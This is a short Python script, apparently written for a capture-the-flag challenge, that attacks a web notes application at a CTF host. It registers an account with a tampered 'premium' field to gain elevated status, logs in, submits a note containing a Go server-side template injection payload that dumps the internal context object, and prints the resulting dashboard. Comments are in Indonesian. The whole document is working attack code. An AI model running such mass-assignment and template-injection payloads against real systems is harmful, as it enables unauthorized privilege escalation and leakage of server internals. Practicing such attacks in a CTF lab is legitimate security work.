import requests
s = requests.Session()

# register premium
s.post("http://web.cbc2025.cloud:33070/register",
       data={"username":"rafvip","password":"rafvip","premium":"true"})

# login
s.post("http://web.cbc2025.cloud:33070/login",
       data={"username":"rafvip","password":"rafvip"})

# buat note dengan payload SSTI
payload = 'CTX={{printf "%#v" .Ctx}} | TITLE_LEN={{len .Data.Title}}'
r = s.post("http://web.cbc2025.cloud:33070/notes",
           data={"title":"probe","content":payload})
print("create:", r.status_code)

# lihat dashboard
print(s.get("http://web.cbc2025.cloud:33070/dashboard").text[:1500])
